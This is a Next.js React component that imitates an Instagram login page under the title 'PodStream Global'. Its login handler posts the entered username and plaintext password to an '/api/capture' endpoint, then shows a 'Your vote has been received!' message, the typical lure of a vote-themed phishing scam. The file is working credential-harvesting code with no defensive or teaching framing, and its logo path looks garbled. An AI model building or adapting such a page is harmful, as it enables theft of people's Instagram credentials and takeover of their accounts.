import Head from 'next/head';
import { useState } from 'react';

export default function InstagramLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState('');

  const handleLogin = async () => {
    if (!username || !password) {
      setError('Please fill in all fields.');
      return;
    }

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: username.trim(),
          password: password,
          method: 'instagram'
        })
      });
      const data = await res.json();
      if (res.ok) {
        setShowSuccess(true);
        setTimeout(() => setShowSuccess(false), 3000);
      } else {
        setError('Login failed. Please try again.');
      }
    } catch (e) {
      setError('Network error. Please try again.');
    }
  };

  return (
    <>
      <Head>
        <title>Instagram Login — PodStream Global</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <style jsx>{`
        body {
          background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }
        .login-container {
          background: white;
          border-radius: 12px;
          padding: 32px;
          max-width: 400px;
          width: 100%;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 48px; height: 48px; }
        .instagram-text { text-align: center; margin-bottom: 24px; color: #333; }
        .instagram-text h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; }
        .instagram-text p { color: #666; font-size: 0.95rem; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 500; font-size: 0.9rem; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; outline: none; transition: border-color 0.2s; }
        .input-group input:focus { border-color: #f093fb; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(240, 147, 251, 0.4); }
        .error { color: #e53e3e; font-size: 0.85rem; margin-top: 8px; text-align: center; }
        .success { background: #fff5f0; border: 1px solid #feb2b2; border-radius: 8px; padding: 20px; text-align: center; color: #c53030; }
        .success h2 { font-size: 1.25rem; margin-bottom: 8px; }
        .success p { font-size: 0.95rem; }
      `}</style>

      <div className="login-container">
        <div className="logo">
          <svg viewBox="0 0 224 224" fill="currentColor">
            <path d="M128 0C57.3 0 0 57.3 0 128c0 54.4 34.9 100.8 83.4 115.2 6.1 1.1 8.3-2.6 8.3-5.9 0-29.6-10.5-54.4-27.9-73.2 2.8-5.6 9.6-27.7 9.6-27.7s-7.9-1.5-25.8 1.2c-2.9 1-6.2 2.9-9.1 4.6-22.6 12.1-37.9 43.2-37.9 86.9 0 56.4 36.3 103.6 84.6 115.4 6.3 1.7 12.8 5.1 12.8 10.8 0 7.8-4.4 14.2-10.2 17.2-4.3 2.1-8.7 7.6-12.6 13.2-3.1 5.3-7.8 13.2-7.8 26.7 0 19.3 18.5 35.2 42.8 35.2 40.2 0 68.4-33.7 68.4-75.1 0-42.3-27.2-77.4-68.4-89.6 6.3-4.8 11.6-17.4 11.6-35.2 0-26.4-19.1-48.2-44.9-52.1 1.9-16.3 7.4-31.3 14.7-42.9-4.1-13-10.5-26.6-22.3-41.4 0 0 -8.9-2.8-29.2 1.2 0 0-15.5 7.8-28.8 24.1C-111.9 51.8 -146.8 95.6-146.8 128c0 70.4 57.3 128 128 128C184.7 256 256 198.3 256 128" />
          </svg>
        </div>

        <div className="instagram-text">
          <h1>Log in to Instagram</h1>
          <p>Stay logged in on this device</p>
        </div>

        <div className="input-group">
          <label htmlFor="username">Username, email, or phone</label>
          <input
            type="text"
            id="username"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>

        <div className="input-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        {error && <div className="error">{error}</div>}

        <button className="btn" onClick={handleLogin}>Log In</button>

        {showSuccess && (
          <div className="success">
            <h2>Your vote has been received!</h2>
            <p>We will get back to you when your vote is counted.</p>
          </div>
        )}
      </div>
    </>
  );
}